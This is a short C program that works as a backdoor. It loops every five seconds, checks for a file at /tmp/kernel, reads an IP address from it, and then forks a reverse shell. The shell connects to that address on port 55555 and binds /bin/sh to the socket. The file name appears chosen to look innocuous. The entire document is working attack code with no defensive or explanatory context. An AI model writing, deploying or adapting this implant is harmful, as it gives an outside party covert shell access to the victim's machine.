#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int pop(char *addr, int port) {
    struct sockaddr_in sa;
    int child = fork();
    if (child == 0) {
        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = inet_addr(addr);
        sa.sin_port = htons(port);

        int s = socket(AF_INET, SOCK_STREAM, 0);
        connect(s, (struct sockaddr *)&sa, sizeof(sa));
        dup2(s, 0);
        dup2(s, 1);
        dup2(s, 2);
        execve("/bin/sh", 0, 0);
    } else 
        return 1;

    return 0;
}

int main(int argc, char *argv[])
{
    int c;
    char buff[64];
    while (1) {
        sleep(5);
        FILE *f = fopen("/tmp/kernel", "r");
        //if( access("/tmp/kernel",F_OK ) != -1 ) {
        if (f != NULL ) {
            fgets(buff, 64, f);
            printf("calling out to %s\n", buff);
            pop(buff,55555);
        } else
            continue;
    }
}
